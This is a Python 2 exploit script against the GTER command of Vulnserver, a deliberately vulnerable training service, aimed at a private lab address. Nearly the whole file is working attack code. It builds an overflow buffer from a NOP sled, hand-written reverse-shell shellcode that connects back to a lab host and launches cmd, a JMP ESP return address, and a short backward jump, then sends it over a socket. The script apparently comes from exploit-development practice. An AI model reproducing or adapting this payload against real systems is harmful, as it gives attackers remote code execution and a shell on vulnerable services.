import socket
import struct
import time

print "\nExploitation of GTER Command - Custom Reverse Shell\n"

ip_addr = '192.168.199.130'
port = 9999

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################
revshell = "\x50\x5c\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x6a\x8b\xab\x71\x31\xc0\xff\xd3\x96\x68\xc0\xa8\xc7\x80\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\x07\x4a\xab\x71\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x6b\x23\x80\x7c\xff\xd3"

reverse_shell_buffer = "\x90"*(147-len(revshell)) + revshell
print "Reverse Shell buffer size: %d" % len(reverse_shell_buffer)

# negative jump 128 bytes -128 is the max we can jump back for a short jump 
jmpshort = '\xeb\x80\x90\x90'

jmp_esp = struct.pack("<I", 0x625011AF)

# Now we can try to send our egghunter shellcode to GTER   
evil_buffer = "GTER /.:/" + reverse_shell_buffer + jmp_esp + jmpshort + 'E'*(5000-147-4-4)
send_evil_buffer(evil_buffer)

    
    
